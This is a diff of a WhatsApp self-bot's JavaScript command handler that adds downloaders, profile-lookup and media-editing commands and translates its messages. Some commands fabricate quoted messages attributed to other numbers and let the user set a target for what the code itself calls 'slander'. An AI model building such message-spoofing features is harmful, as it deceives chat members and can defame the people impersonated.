+					const can =['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
+					const tik = can[Math.floor(Math.random() * can.length)]
+					client.sendMessage(from, 'Question : *'+cantik+'*\n\nAnswer : '+ tik+'%', text, { quoted: mek })
+					break;
+		case "tts":
+				// source code by xeon⛔
+                 if (!isGroup) return reply( mess.only.group);
+				if (args.length < 1) return client.sendMessage(from, 'the language code is required!!!', text, {quoted: mek})
+					const gtts = require('./lib/gtts')(args[0])
+					if (args.length < 2) return client.sendMessage(from, 'Which text do you want to make a voice for? the voice of the devil?', text, {quoted: mek})
+					dtt = body.slice(8)
+					ranm = getRandom('.mp3')
+					rano = getRandom('.ogg')
+					dtt.length > 500
+					? reply('The text is mostly devil!!! 😤')
+					: gtts.save(ranm, dtt, function() {
+						exec(`ffmpeg -i ${ranm} -ar 48000 -vn -c:a libopus ${rano}`, (err) => {
+							fs.unlinkSync(ranm)
+							buffer = fs.readFileSync(rano)
+							if (err) return reply(ind.stikga())
+							client.sendMessage(from, buffer, audio, {quoted: mek, ptt:true})
+							fs.unlinkSync(rano)
+						})
+					})
+					break;
+					case "attp":
+				if (args.length < 1) return reply(`_Where is the text Beb?_\n*Example ${prefix}attp My face is Handsome, thats okay :v*`)
+				attp2 = await getBuffer(`https://api.xteam.xyz/attp?file&text=${body.slice(6)}`)
+				client.sendMessage(from, attp2, sticker, {quoted: mek})
+				break;
+				    case "linkgc":
+        if (!isGroup) return reply(mess.only.group)
+        if (!isGroupAdmins) return reply(mess.only.admin)
+        if (!isBotGroupAdmins) return reply(mess.only.Badmin)
+        linkgc = await client.groupInviteCode(from)
+        reply('https://chat.whatsapp.com/'+linkgc)
+        break;
+              case "slap":
+					kapankah = body.slice(1)
+					const slap =['whoosh! whoosh!','pow! pow!']
+					const ple = slap[Math.floor(Math.random() * slap.length)]
+					pod = await getBuffer(`https://media.giphy.com/media/S8507sBJm1598XnsgD/source.gif`)
+					client.sendMessage(from, pod, image, { quoted: mek, caption: '*you got slapped for being toxic*\n\n'+ ple })
+					break
       //end
-      //------------------< Downloader Features >-------------------
+      //------------------< Downloader features >-------------------
       case "tiktok":
         if (!isUrl(args[0]) && !args[0].includes("tiktok.com"))
           return reply(mess.Iv);
@@ -2860,20 +2209,50 @@ case "asupan3": // by xeon
           ]
         );
         break;
-
-     
+      case "youtube":
+        if (!isUrl(args[0]) && !args[0].includes("youtu"))
+          return reply(mess.Iv);
+        var bv = await fetchJson(
+          `https://api.dhnjing.xyz/downloader/youtube/video?url=${args[0]}`
+        );
+        var b = bv.result.creator_metadata;
+        var tamnel = await getBuffer(bv.result.media_resources.thumbnail);
+        var a = bv.result.media_metadata;
+        sendButImage(
+          from,
+          `*Name channel*: ${b.name}\n📜 *Title*: ${a.title}\n❤️ *Like*: ${a.totalLikes}\n👎 *Dislike*: ${a.totalDislikes}\n🎞️ *Views*: ${a.totalViews}`,
+          `krpaya ek praaroop chunen jise aap download karana chaahate hain`,
+          tamnel,
+          [
+            {
+              buttonId: `${prefix}ytdl ${args[0]}|video`,
+              buttonText: {
+                displayText: `VIDEO`,
+              },
+              type: 1,
+            },
+            {
+              buttonId: `${prefix}ytdl ${args[0]}|music`,
+              buttonText: {
+                displayText: `AUDIO`,
+              },
+              type: 1,
+            },
+          ]
+        );
+        break;
       //JCCHCCGHTHDTRSRS
       case "twitter":
         if (!isUrl(args[0]) && !args[0].includes("twitter.com"))
           return reply(mess.Iv);
-        if (!q) return fakegroup("the link?");
+        if (!q) return fakegroup("Link kaha hai?");
         ten = args[0];
         var res = await hx.twitter(`${ten}`);
         ren = `${g.HD}`;
         sendMediaURL(from, ren, "DONE");
         break;
       case "facebook":
-        if (!q) return reply("The link?");
+        if (!q) return reply("Link kaha hai?");
         if (!isUrl(args[0]) && !args[0].includes("facebook.com"))
           return reply(mess.Iv);
         reply(mess.wait);
@@ -2886,19 +2265,19 @@ case "asupan3": // by xeon
       case "instagram":
         if (!isUrl(args[0]) && !args[0].includes("instagram.com"))
           return reply(mess.Iv);
-        if (!q) return fakegroup("The link?");
+        if (!q) return fakegroup("Link kaha hai?");
         reply(mess.wait);
         hx.igdl(args[0]).then(async (result) => {
           for (let i of result.medias) {
             if (i.url.includes("mp4")) {
               let link = await getBuffer(i.url);
-              itsmevall.sendMessage(from, link, video, {
+              client.sendMessage(from, link, video, {
                 quoted: mek,
                 caption: `Type : ${i.type}`,
               });
             } else {
               let link = await getBuffer(i.url);
-              itsmevall.sendMessage(from, link, image, {
+              client.sendMessage(from, link, image, {
                 quoted: mek,
                 caption: `Type : ${i.type}`,
               });
@@ -2920,7 +2299,21 @@ case "asupan3": // by xeon
           sendMediaURL(from, bv.result.media_resources.video.videoUrl, "");
         }
         break;
-      
+      case "ytdl":
+        var gh = args.join("");
+        var link = gh.split("|")[0];
+        var tipe = gh.split("|")[1];
+        var bv = await fetchJson(
+          `https://api.dhnjing.xyz/downloader/youtube/${tipe}?url=${link}`
+        );
+        if (tipe == "video") {
+          sendMediaURL(from, bv.result.media_resources.videoUrl, "");
+        }
+        if (tipe == "music") {
+          sendMediaURL(from, bv.result.media_resources.musicUrl, "");
+        }
+        break;
+
       case "noprefix":
         if (!mek.key.fromMe) return;
         if (prefixStatus == false) return reply("No prefix is recently on!");
@@ -2948,7 +2341,7 @@ case "asupan3": // by xeon
           return reply(
             "*Voting*\n\n" +
               prefix +
-              "voting @tag target | reason  | 1 (1 = 1 Minute)"
+              "voting @tag target | reason  | 1 (1 = 1 Menit)"
           );
         if (
           mek.message.extendedTextMessage.contextInfo.mentionedJid.length > 0 ||
@@ -2958,15 +2351,15 @@ case "asupan3": // by xeon
           split = args.join(" ").replace("@", "").split("|");
           if (!Number(split[2]))
             return reply(
-              "enter number in line 3\nExample: 1-9999\n1 = 1 Minute"
+              "enter number in row 3\nExample: 1-9999\n1 = 1 Min"
             );
           await mentions(
             "Vote " +
               "@" +
               id.split("@")[0] +
-              " Di Mulai" +
+              " On Start" +
               "\n\n" +
-              `vote = ✅\ndevote = ❌\n\nReason: ${split[1]}`,
+              `vote = ✅\ndevote = ❌\n\Reason: ${split[1]}`,
             [id],
             true
           );
@@ -2983,7 +2376,7 @@ case "asupan3": // by xeon
           reply(res);
         });
         break;
-     /* case "igstalk":
+      case "igstalk":
         if (!q) return reply("Username?");
         const tod = await fetchJson(
           `https://api.dhnjing.xyz/stalk/instagram?user=${q}`
@@ -2997,9 +2390,23 @@ case "asupan3": // by xeon
     Number of posts: ${tod.result.user_post_total}
     Following: ${tod.result.user_following}
     Follower: ${tod.result.user_followers}`;
-        itsmevall.sendMessage(from, buff, image, { quoted: mek, caption: tt });
-        break;*/
-      
+        client.sendMessage(from, buff, image, { quoted: mek, caption: tt });
+        break;
+      case "githubstalk":
+        if (!q) return reply("Username?");
+        const oi = await fetchJson(
+          `https://api.dhnjing.xyz/stalk/github?user=dehan-j1ng`
+        );
+        const mm = `*GITHUB STALK*
+    Username: ${oi.result.username}
+    Fullname: ${oi.result.name}
+    Bio: ${oi.result.user_bio}
+
+    Number of repost: ${oi.result.user_repo}
+    Following: ${oi.result.user_following}
+    Follower: ${oi.result.user_followers}`;
+        reply(mm);
+        break;
       case "tiktokstalk":
         if (!q) return reply("Username? ");
         var i = await fetchJson(
@@ -3014,7 +2421,7 @@ case "asupan3": // by xeon
     Number of posts: ${i.result.stats.videoCount}
     Following: ${i.result.stats.followingCount}
     Follower: ${i.result.stats.followerCount}`;
-        itsmevall.sendMessage(from, buff, image, { quoted: mek, caption: ii });
+        client.sendMessage(from, buff, image, { quoted: mek, caption: ii });
         break;
       case "igstory":
         if (!q) return reply("Username?");
@@ -3022,13 +2429,13 @@ case "asupan3": // by xeon
           for (let i of result.medias) {
             if (i.url.includes("mp4")) {
               let link = await getBuffer(i.url);
-              itsmevall.sendMessage(from, link, video, {
+              client.sendMessage(from, link, video, {
                 quoted: mek,
                 caption: `Type : ${i.type}`,
               });
             } else {
               let link = await getBuffer(i.url);
-              itsmevall.sendMessage(from, link, image, {
+              client.sendMessage(from, link, image, {
                 quoted: mek,
                 caption: `Type : ${i.type}`,
               });
@@ -3036,31 +2443,6 @@ case "asupan3": // by xeon
           }
         });
         break;
-
-  case 'write': case 'writeabook':            
-            if (args.length == 0) return reply(`contoh: ${prefix + command} xeon`)
-            reply(mess.wait)
-            teks = args.join(" ")
-            ini_buf = await getBuffer(`https://itsmevall.herokuapp.com/api/maker/nulis?apikey=${valkey}&text=${teks}`)            
-            itsmevall.sendMessage(from, ini_buf, image, { thumbnail: iye, caption: `*nih kak*`, quoted: mek})
-         
-            break
-case 'vnsecond':
-encmediam = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
-					mediam = await itsmevall.downloadAndSaveMediaMessage(encmediam)
-					cokmatane = Number(args[0])
-					hah = fs.readFileSync(mediam)
-						itsmevall.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', duration: cokmatane, ptt: true, quoted:mek})
-						fs.unlinkSync(mediam)
-				break
-				case 'videosecond':
-				encmedian = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
-					median = await itsmevall.downloadAndSaveMediaMessage(encmedian)
-					cokmatane = Number(args[0])
-					hah = fs.readFileSync(median)
-						itsmevall.sendMessage(from, hah, video, {mimetype: 'video/mp4', duration: cokmatane, quoted: mek})
-						fs.unlinkSync(median)
-				break
       case "colongsw": //xeon
         if (!mek.key.fromMe) return;
         if ((isMedia && !mek.message.videoMessage) || isQuotedImage) {
@@ -3068,8 +2450,8 @@ encmediam = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.exten
             ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                 .extendedTextMessage.contextInfo
             : mek;
-          owgi = await itsmevall.downloadAndSaveMediaMessage(ger);
-          itsmevall.sendMessage(sender, fs.readFileSync(owgi), "imageMessage", {
+          owgi = await client.downloadAndSaveMediaMessage(ger);
+          client.sendMessage(sender, fs.readFileSync(owgi), "imageMessage", {
             caption: q,
           });
           reply("Success");
@@ -3079,8 +2461,8 @@ encmediam = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.exten
             ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                 .extendedTextMessage.contextInfo
             : mek;
-          owgi = await itsmevall.downloadAndSaveMediaMessage(ger);
-          itsmevall.sendMessage(sender, fs.readFileSync(owgi), "videoMessage", {
+          owgi = await client.downloadAndSaveMediaMessage(ger);
+          client.sendMessage(sender, fs.readFileSync(owgi), "videoMessage", {
             caption: q,
           });
           reply("Success");
@@ -3090,36 +2472,36 @@ encmediam = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.exten
         }
         break;
       case "searchmessage":
-        if (!q) return reply("whats the message?");
-        let v = await itsmevall.searchMessages(q, from, 10, 1);
+        if (!q) return reply("what is the message?");
+        let v = await client.searchMessages(q, from, 10, 1);
         let s = v.messages;
         let el = s.filter((v) => v.message);
         el.shift();
         try {
           if (el[0].message.conversation == undefined) return;
-          reply(`Found ${el.length} message`);
+          reply(`Found ${el.length} pesan`);
           await sleep(3000);
           for (let i = 0; i < el.length; i++) {
-            await itsmevall.sendMessage(from, "Heres the message", text, {
+            await client.sendMessage(from, "Here is the message", text, {
               quoted: el[i],
             });
           }
-         } catch (e) {
+        } catch (e) {
           reply("Message not found!");
         }
         break;
       case "lyrics":
-        if (!q) return reply("What song is it?");
+        if (!q) return reply("yah khonsa gaana hai?");
         let song = await hx.lirik(q);
         sendMediaURL(from, song.thumb, song.lirik);
         break;
       case "otaku":
-        if (!q) return reply("anime title?");
+        if (!q) return reply("the title of the anime?");
         let anime = await hx.otakudesu(q);
         rem = `*Title* : ${anime.judul}
 *Japan* : ${anime.jepang}
 *Rating* : ${anime.rate}
-*Producer* : ${anime.produser}
+*Produser* : ${anime.produser}
 *Status* : ${anime.status}
 *Episode* : ${anime.episode}
 *Duration* : ${anime.durasi}
@@ -3129,32 +2511,32 @@ encmediam = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.exten
 *Synopsis* :
 ${anime.desc}\n\n*Link Batch* : ${anime.batch}\n*Link Download SD* : ${anime.batchSD}\n*Link Download HD* : ${anime.batchHD}`;
         ram = await getBuffer(anime.img);
-        itsmevall.sendMessage(from, ram, image, { quoted: mek, caption: rem });
+        client.sendMessage(from, ram, image, { quoted: mek, caption: rem });
         break;
       case "comic":
         if (!q) return reply(`judulnya?\n${prefix}komiku mao gakuin`);
         let komik = await hx.komiku(q);
         result = `*Title* : ${komik.title}\n
-*Title* : ${komik.indo}\n
+*Title Indo* : ${komik.indo}\n
 *Update* : ${komik.update}\n
 *Desc* : ${komik.desc}\n
 *Early Chapter* : ${komik.chapter_awal}
 *Final Chapter* : ${komik.chapter_akhir}`;
         sendMediaURL(from, komik.image, result);
         break;
-      case "char":
-        if (!q) return reply(`gambar apa?\n${prefix}chara itsmevall`);
+      case "chara":
+        if (!q) return reply(`gambar apa?\n${prefix}chara client`);
         let im = await hx.chara(q);
         let acak = im[Math.floor(Math.random() * im.length)];
         let li = await getBuffer(acak);
-        await itsmevall.sendMessage(from, li, image, { quoted: mek });
+        await client.sendMessage(from, li, image, { quoted: mek });
         break;
       case "pinterest":
         if (!q) return reply("What picture is it?");
         let pin = await hx.pinterest(q);
         let ac = pin[Math.floor(Math.random() * pin.length)];
         let di = await getBuffer(ac);
-        await itsmevall.sendMessage(from, di, image, { quoted: mek });
+        await client.sendMessage(from, di, image, { quoted: mek });
         break;
       case "playstore":
         if (!q) return reply("what are you looking for?");
@@ -3190,14 +2572,15 @@ ${anime.desc}\n\n*Link Batch* : ${anime.batch}\n*Link Download SD* : ${anime.bat
         fakestatus(" ```YOU ARE OFFLINE``` ");
         break;
       case "get":
-        if (!q) return reply("The link?");
+        if (!q) return reply("Link kaha hai?");
         fetch(`${args[0]}`)
           .then((res) => res.text())
           .then((bu) => {
             fakestatus(bu);
           });
         break;
-      case "contag":
+      case "contacttag":
+        if (!mek.key.fromMe) return reply("SELF-BOT");
         pe = args.join("");
         entah = pe.split("|")[0];
         nah = pe.split("|")[1];
@@ -3214,7 +2597,7 @@ ${anime.desc}\n\n*Link Batch* : ${anime.batch}\n*Link Download SD* : ${anime.bat
             "+" + entah
           ).getNumber("internasional")}\n` +
           "END:VCARD".trim();
-        itsmevall.sendMessage(
+        client.sendMessage(
           from,
           { displayName: `${nah}`, vcard: vcard },
           contact,
@@ -3230,12 +2613,12 @@ ${anime.desc}\n\n*Link Batch* : ${anime.batch}\n*Link Download SD* : ${anime.bat
             ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                 .extendedTextMessage.contextInfo
             : mek;
-          file = await itsmevall.downloadAndSaveMediaMessage(
+          file = await client.downloadAndSaveMediaMessage(
             encmedia,
             (filename = getRandom())
           );
           value = args.join(" ");
-          var group = await itsmevall.groupMetadata(from);
+          var group = await client.groupMetadata(from);
           var member = group["participants"];
           var mem = [];
           member.map(async (adm) => {
@@ -3246,13 +2629,13 @@ ${anime.desc}\n\n*Link Batch* : ${anime.batch}\n*Link Download SD* : ${anime.bat
             quoted: mek,
           };
           ini_buffer = fs.readFileSync(file);
-          itsmevall.sendMessage(from, ini_buffer, sticker, options);
+          client.sendMessage(from, ini_buffer, sticker, options);
           fs.unlinkSync(file);
         } else {
           reply(`*Reply sticker that has been sent*`);
         }
         break;
-      case "totag":
+      case "mediatag":
         if (
           ((isMedia && !mek.message.videoMessage) || isQuotedSticker) &&
           args.length == 0
@@ -3261,12 +2644,12 @@ ${anime.desc}\n\n*Link Batch* : ${anime.batch}\n*Link Download SD* : ${anime.bat
             ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                 .extendedTextMessage.contextInfo
             : mek;
-          file = await itsmevall.downloadAndSaveMediaMessage(
+          file = await client.downloadAndSaveMediaMessage(
             encmedia,
             (filename = getRandom())
           );
           value = args.join(" ");
-          var group = await itsmevall.groupMetadata(from);
+          var group = await client.groupMetadata(from);
           var member = group["participants"];
           var mem = [];
           member.map(async (adm) => {
@@ -3277,7 +2660,7 @@ ${anime.desc}\n\n*Link Batch* : ${anime.batch}\n*Link Download SD* : ${anime.bat
             quoted: mek,
           };
           ini_buffer = fs.readFileSync(file);
-          itsmevall.sendMessage(from, ini_buffer, sticker, options);
+          client.sendMessage(from, ini_buffer, sticker, options);
           fs.unlinkSync(file);
         } else if (
           ((isMedia && !mek.message.videoMessage) || isQuotedImage) &&
@@ -3287,12 +2670,12 @@ ${anime.desc}\n\n*Link Batch* : ${anime.batch}\n*Link Download SD* : ${anime.bat
             ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                 .extendedTextMessage.contextInfo
             : mek;
-          file = await itsmevall.downloadAndSaveMediaMessage(
+          file = await client.downloadAndSaveMediaMessage(
             encmedia,
             (filename = getRandom())
           );
           value = args.join(" ");
-          var group = await itsmevall.groupMetadata(from);
+          var group = await client.groupMetadata(from);
           var member = group["participants"];
           var mem = [];
           member.map(async (adm) => {
@@ -3303,7 +2686,7 @@ ${anime.desc}\n\n*Link Batch* : ${anime.batch}\n*Link Download SD* : ${anime.bat
             quoted: mek,
           };
           ini_buffer = fs.readFileSync(file);
-          itsmevall.sendMessage(from, ini_buffer, image, options);
+          client.sendMessage(from, ini_buffer, image, options);
           fs.unlinkSync(file);
         } else if (
           ((isMedia && !mek.message.videoMessage) || isQuotedAudio) &&
@@ -3313,12 +2696,12 @@ ${anime.desc}\n\n*Link Batch* : ${anime.batch}\n*Link Download SD* : ${anime.bat
             ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                 .extendedTextMessage.contextInfo
             : mek;
-          file = await itsmevall.downloadAndSaveMediaMessage(
+          file = await client.downloadAndSaveMediaMessage(
             encmedia,
             (filename = getRandom())
           );
           value = args.join(" ");
-          var group = await itsmevall.groupMetadata(from);
+          var group = await client.groupMetadata(from);
           var member = group["participants"];
           var mem = [];
           member.map(async (adm) => {
@@ -3331,7 +2714,7 @@ ${anime.desc}\n\n*Link Batch* : ${anime.batch}\n*Link Download SD* : ${anime.bat
             quoted: mek,
           };
           ini_buffer = fs.readFileSync(file);
-          itsmevall.sendMessage(from, ini_buffer, audio, options);
+          client.sendMessage(from, ini_buffer, audio, options);
           fs.unlinkSync(file);
         } else if (
           ((isMedia && !mek.message.videoMessage) || isQuotedVideo) &&
@@ -3341,12 +2724,12 @@ ${anime.desc}\n\n*Link Batch* : ${anime.batch}\n*Link Download SD* : ${anime.bat
             ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                 .extendedTextMessage.contextInfo
             : mek;
-          file = await itsmevall.downloadAndSaveMediaMessage(
+          file = await client.downloadAndSaveMediaMessage(
             encmedia,
             (filename = getRandom())
           );
           value = args.join(" ");
-          var group = await itsmevall.groupMetadata(from);
+          var group = await client.groupMetadata(from);
           var member = group["participants"];
           var mem = [];
           member.map(async (adm) => {
@@ -3358,7 +2741,7 @@ ${anime.desc}\n\n*Link Batch* : ${anime.batch}\n*Link Download SD* : ${anime.bat
             quoted: mek,
           };
           ini_buffer = fs.readFileSync(file);
-          itsmevall.sendMessage(from, ini_buffer, video, options);
+          client.sendMessage(from, ini_buffer, video, options);
           fs.unlinkSync(file);
         } else {
           reply(
@@ -3376,7 +2759,7 @@ ${anime.desc}\n\n*Link Batch* : ${anime.batch}\n*Link Download SD* : ${anime.bat
         var replace = gh.split("|")[0];
         var target = gh.split("|")[1];
         var bot = gh.split("|")[2];
-        itsmevall.sendMessage(from, `${bot}`, text, {
+        client.sendMessage(from, `${bot}`, text, {
           quoted: {
             key: {
               fromMe: false,
@@ -3388,7 +2771,7 @@ ${anime.desc}\n\n*Link Batch* : ${anime.batch}\n*Link Download SD* : ${anime.bat
         });
         break;
       case "settarget":
-        if (!q) return reply(`${prefix}settarget 91xx`);
+        if (!q) return reply(`${prefix}settarget 91xxxxx`);
         targetpc = args[0];
         fakegroup(`Success Changing the target of slanderpc : ${targetpc}`);
         break;
@@ -3402,30 +2785,30 @@ ${anime.desc}\n\n*Link Batch* : ${anime.batch}\n*Link Download SD* : ${anime.bat
             quotedMessage: { extendedTextMessage: { text: split[0] } },
           },
         };
-        const responye = await itsmevall.sendMessage(
+        const responye = await client.sendMessage(
           jids,
           `${split[1]}`,
           MessageType.text,
           options
         );
-        await itsmevall.deleteMessage(jids, {
+        await client.deleteMessage(jids, {
           id: responye.messageID,
           remoteJid: jids,
           fromMe: true,
         });
         break;
       case "tomp3":
-        if (!isQuotedVideo) return fakegroup("Reply the video!");
+        if (!isQuotedVideo) return fakegroup("video ko reply kar!");
         fakegroup(mess.wait);
         encmedia = JSON.parse(JSON.stringify(mek).replace("quotedM", "m"))
           .message.extendedTextMessage.contextInfo;
-        media = await itsmevall.downloadAndSaveMediaMessage(encmedia);
+        media = await client.downloadAndSaveMediaMessage(encmedia);
         ran = getRandom(".mp4");
         exec(`ffmpeg -i ${media} ${ran}`, (err) => {
           fs.unlinkSync(media);
           if (err) return fakegroup(`Err: ${err}`);
           buffer453 = fs.readFileSync(ran);
-          itsmevall.sendMessage(from, buffer453, audio, {
+          client.sendMessage(from, buffer453, audio, {
             mimetype: "audio/mp4",
             quoted: mek,
           });
@@ -3433,11 +2816,11 @@ ${anime.desc}\n\n*Link Batch* : ${anime.batch}\n*Link Download SD* : ${anime.bat
         });
         break;
       case "fast":
-        if (!isQuotedVideo) return fakegroup("Reply the video!");
+        if (!isQuotedVideo) return fakegroup("video ko reply kar!");
         fakegroup(mess.wait);
         encmedia = JSON.parse(JSON.stringify(mek).replace("quotedM", "m"))
           .message.extendedTextMessage.contextInfo;
-        media = await itsmevall.downloadAndSaveMediaMessage(encmedia);
+        media = await client.downloadAndSaveMediaMessage(encmedia);
         ran = getRandom(".mp4");
         exec(
           `ffmpeg -i ${media} -filter_complex "[0:v]setpts=0.5*PTS[v];[0:a]atempo=2[a]" -map "[v]" -map "[a]" ${ran}`,
@@ -3445,7 +2828,7 @@ ${anime.desc}\n\n*Link Batch* : ${anime.batch}\n*Link Download SD* : ${anime.bat
             fs.unlinkSync(media);
             if (err) return fakegroup(`Err: ${err}`);
             buffer453 = fs.readFileSync(ran);
-            itsmevall.sendMessage(from, buffer453, video, {
+            client.sendMessage(from, buffer453, video, {
               mimetype: "video/mp4",
               quoted: mek,
             });
@@ -3454,11 +2837,11 @@ ${anime.desc}\n\n*Link Batch* : ${anime.batch}\n*Link Download SD* : ${anime.bat
         );
         break;
       case "slow":
-        if (!isQuotedVideo) return fakegroup("Reply the video!");
+        if (!isQuotedVideo) return fakegroup("video ko reply kar!");
         fakegroup(mess.wait);
         encmedia = JSON.parse(JSON.stringify(mek).replace("quotedM", "m"))
           .message.extendedTextMessage.contextInfo;
-        media = await itsmevall.downloadAndSaveMediaMessage(encmedia);
+        media = await client.downloadAndSaveMediaMessage(encmedia);
         ran = getRandom(".mp4");
         exec(
           `ffmpeg -i ${media} -filter_complex "[0:v]setpts=2*PTS[v];[0:a]atempo=0.5[a]" -map "[v]" -map "[a]" ${ran}`,
@@ -3466,7 +2849,7 @@ ${anime.desc}\n\n*Link Batch* : ${anime.batch}\n*Link Download SD* : ${anime.bat
             fs.unlinkSync(media);
             if (err) return fakegroup(`Err: ${err}`);
             buffer453 = fs.readFileSync(ran);
-            itsmevall.sendMessage(from, buffer453, video, {
+            client.sendMessage(from, buffer453, video, {
               mimetype: "video/mp4",
               quoted: mek,
             });
@@ -3475,45 +2858,23 @@ ${anime.desc}\n\n*Link Batch* : ${anime.batch}\n*Link Download SD* : ${anime.bat
         );
         break;
       case "reverse":
-        if (!isQuotedVideo) return fakegroup("Reply the video!");
+        if (!isQuotedVideo) return fakegroup("video ko reply kar!");
         encmedia = JSON.parse(JSON.stringify(mek).replace("quotedM", "m"))
           .message.extendedTextMessage.contextInfo;
-        media = await itsmevall.downloadAndSaveMediaMessage(encmedia);
+        media = await client.downloadAndSaveMediaMessage(encmedia);
         ran = getRandom(".mp4");
         exec(`ffmpeg -i ${media} -vf reverse -af areverse ${ran}`, (err) => {
           fs.unlinkSync(media);
           if (err) return fakegroup(`Err: ${err}`);
           buffer453 = fs.readFileSync(ran);
-          itsmevall.sendMessage(from, buffer453, video, {
+          client.sendMessage(from, buffer453, video, {
             mimetype: "video/mp4",
             quoted: mek,
           });
           fs.unlinkSync(ran);
         });
         break;
-  case 'buttons5':
-              const mathdare = dare[Math.floor(Math.random() * (dare.length))]
-              result = `${mathdare}`
-              buttons = [{buttonId: `${prefix}buttons6`,buttonText:{displayText: 'Truth'},type:1},{buttonId:`${prefix}buttons5`,buttonText:{displayText:'Dare'},type:1},{buttonId:`${prefix}tod`,buttonText:{displayText:'Tod'},type:1}]
-              buttonsMessage = { contentText: `${result}`, footerText: 'Play again', buttons: buttons, headerType: 1 }
-              prep = await itsmevall.prepareMessageFromContent(from,{buttonsMessage},{})
-              itsmevall.relayWAMessage(prep)
-              break
-          case 'buttons6':
-              const randomtruth = truth[Math.floor(Math.random() * truth.length)]
-              result = `${randomtruth}`
-              buttons = [{buttonId: `${prefix}buttons6`,buttonText:{displayText: 'Truth'},type:1},{buttonId:`${prefix}buttons5`,buttonText:{displayText:'Dare'},type:1},{buttonId:`${prefix}tod`,buttonText:{displayText:'Tod'},type:1}]
-              buttonsMessage = { contentText: `${result}`, footerText: 'Play again', buttons: buttons, headerType: 1 }
-              prep = await itsmevall.prepareMessageFromContent(from,{buttonsMessage},{})
-              itsmevall.relayWAMessage(prep)
-              break
-          case 'tod':
-              result =`*Truth Or Dare*\nPlayers are given the choice between answering questions honestly, or taking on the challenge given`
-              buttons = [{buttonId: `${prefix}buttons6`,buttonText:{displayText: 'Truth'},type:1},{buttonId:`${prefix}buttons5`,buttonText:{displayText:'Dare'},type:1},{buttonId:`${prefix}tod`,buttonText:{displayText:'Tod'},type:1}]
-              buttonsMessage = { contentText: `${result}`, footerText: 'Truth or Dare?', buttons: buttons, headerType: 1 }
-              prep = await itsmevall.prepareMessageFromContent(from,{buttonsMessage},{})
-              itsmevall.relayWAMessage(prep)
-              break
+
       case "anime":
         reply(mess.wait);
         fetch(
@@ -3526,9 +2887,9 @@ ${anime.desc}\n\n*Link Batch* : ${anime.batch}\n*Link Download SD* : ${anime.bat
             imageToBase64(pjr)
               .then((response) => {
                 media = Buffer.from(response, "base64");
-                itsmevall.sendMessage(from, media, image, {
+                client.sendMessage(from, media, image, {
                   quoted: mek,
-                  caption: "HERE",
+                  caption: "ho gya",
                 });
               })
               .catch((error) => {
@@ -3536,134 +2897,6 @@ ${anime.desc}\n\n*Link Batch* : ${anime.batch}\n*Link Download SD* : ${anime.bat
               });
           });
         break;
-case 'calculator':
-				 var mtk = body.slice(12)
-				 teks = `${mtk} = ${Math_js.evaluate(mtk)}`
-				 reply(teks)
-				 break
-				
-				case 'fancytext':
-				if (args.length < 1) return reply('The text?')
-anu = await fetchJson(`https://bx-hunter.herokuapp.com/api/fancytext?text=${body.slice(11)}&apikey=${HunterApi}`, {method: 'get'})
-teks = anu.result
-reply(teks)
-break
-	case 'halloween':
-	if (!arg) return reply(from, `Usage ${prefix}halloween text`, mek)
-	sendMediaURL(from, `https://bx-hunter.herokuapp.com/api/flamingtext/halloween?text=${arg}&apikey=${HunterApi}`)
-   break
-   case 'vampire':
-   if (!arg) return reply(from, `Usage ${prefix}vampire text`, mek)
-   sendMediaURL(from, `https://bx-hunter.herokuapp.com/api/flamingtext/vampire?text=${arg}&apikey=${HunterApi}`)
-   break
-   case 'codetxt':
-   if (!arg) return reply(from, `Usage ${prefix}codetxt text`, mek)
-   sendMediaURL(from, `https://bx-hunter.herokuapp.com/api/maker/carbon?code=${arg}&apikey=${HunterApi}`)
-   break
-case 'matrix':
-				if (!arg) return reply(from, `Usage ${prefix}matrix text`, mek)
-				sendMediaURL(from, `https://bx-hunter.herokuapp.com/api/flamingtext/matrix?text=${arg}&apikey=${HunterApi}`)
-				break
-				case 'googletxt':
-				if (!arg) return reply(from, `Usage ${prefix}googletxt text`, mek)
-				sendMediaURL(from, `https://bx-hunter.herokuapp.com/api/flamingtext/google?text=${arg}&apikey=${HunterApi}`)
-				break
-				case 'spiderman':
-				if (!arg) return reply(from, `Usage ${prefix}sipderman text`, mek)
-				sendMediaURL(from, `https://bx-hunter.herokuapp.com/api/flamingtext/spider?text=${arg}&apikey=${HunterApi}`)
-				break
-				case 'express':
-				if (!arg) return reply(from, `Usage ${prefix}express text`, mek)
-				sendMediaURL(from, `https://bx-hunter.herokuapp.com/api/flamingtext/express?text=${arg}&apikey=${HunterApi}`)
-				break
-				case 'dance':
-				if (!arg) return reply(from, `Usage ${prefix}dance text`, mek)
-				sendMediaURL(from, `https://bx-hunter.herokuapp.com/api/flamingtext/dance?text=${arg}&apikey=${HunterApi}`)
-				break
-				case 'blackbird':
-				if (!arg) return reply(from, `Usage ${prefix}blackbird text`, mek)
-				sendMediaURL(from, `https://bx-hunter.herokuapp.com/api/flamingtext/blackbird?text=${arg}&apikey=${HunterApi}`)
-				break
-				case 'text3d':
-				if (!arg) return reply(from, `Usage ${prefix}text3d text`, mek)
-				sendMediaURL(from, `https://bx-hunter.herokuapp.com/api/flamingtext/text3d?text=${arg}&apikey=${HunterApi}`)
-				break
-				case 'warrior':
-				if (!arg) return reply(from, `Usage ${prefix}warrior text`, mek)
